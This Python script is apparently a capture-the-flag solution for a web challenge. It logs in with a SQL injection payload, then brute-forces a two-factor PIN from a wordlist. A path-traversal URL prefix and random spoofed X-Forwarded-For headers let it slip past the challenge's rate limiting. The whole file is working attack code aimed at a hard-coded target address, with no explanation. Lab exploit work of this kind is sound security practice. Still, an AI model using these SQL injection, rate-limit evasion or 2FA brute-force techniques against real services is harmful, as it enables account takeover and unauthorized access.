import requests
from pwn import *
import random
from urllib.parse import quote
import urllib

burp0_url = "http://94.237.49.138:38220/../auth/verify-2fa"

def generar_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def MakeRequest():
	# Login
	s = requests.Session()

	login_url = "http://94.237.49.138:38220/../auth/login"
	login_data = {
		"username": "admin' or 1=1-- -",
		"password": "admin' or 1=1-- -"
	}
	proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
	l = requests.Request(method='POST', url=login_url, data=login_data)
	prep1 = l.prepare()
	prep1.url = login_url
	#prep1.proxies = proxies
	resp = s.send(prep1)
	with open('/home/viksant/Machines/Challenges/Web/No-Threshold/web_nothreshold/challenge/nums', 'r') as nums:
		p1 = log.progress("PIN")
		p1.status("Starting Attack")
		for num in nums:
			num = num.rstrip()
			burp0_data = {"2fa-code": num}
			p1.status(num)

			random_ip = generar_ip()
			burp0_headers = {
				"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", 
				"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8", 
				"Accept-Language": "en-US,en;q=0.5", 
				"Accept-Encoding": "gzip, deflate, br", 
				"Content-Type": "application/x-www-form-urlencoded", 
				"Origin": "http://94.237.49.138:38220", 
				"Connection": "close", 
				"Referer": "http://94.237.49.138:38220/auth/verify-2fa", 
				"Upgrade-Insecure-Requests": "1",
				"X-Forwarded-For": random_ip}

			p = s.post(url=burp0_url, headers=burp0_headers, data=burp0_data, allow_redirects=True, proxies=proxies)
			if "Invalid 2FA Code!" not in p.text:
				print("Correct pin -> " + num)
				print(p.text)
				break

			elif p.status_code == 302:
				print("PIN ->" + num)
				print(p.text)

if __name__ == '__main__':
	MakeRequest()
